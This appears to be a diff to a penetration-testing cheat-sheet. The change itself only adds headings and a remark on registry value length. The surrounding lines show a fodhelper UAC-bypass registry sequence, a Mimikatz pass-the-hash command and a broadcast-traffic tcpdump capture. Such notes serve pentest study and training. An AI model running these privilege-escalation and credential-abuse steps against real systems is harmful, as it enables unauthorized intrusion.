@@ -9,6 +9,7 @@ References:
  * https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
  * https://ired.team/offensive-security/ (Fantastic - good for stealth options!)
 
+# Network
 ## TCP/445 SMB
 - Check for NULL sessions (target DCs mostly):
   ```
@@ -207,6 +208,8 @@ Includes web services (not just port 80)
 ## Broadcast Traffic Attacks
 - `tcpdump` command for listening to all broadcast traffic: `tcpdump -i eth0 -w dumps/tcpdump-broadcast ether broadcast and ether multicast`
 
+---
+
 # Linux
 
 # Windows
@@ -271,6 +274,7 @@ Includes web services (not just port 80)
   PS C:\> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
   PS C:\> C:\Windows\System32\fodhelper.exe  
   ```
+  - Note that the reg cmd value can be up to 16383 characters
 
 ## Mimikatz
 You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
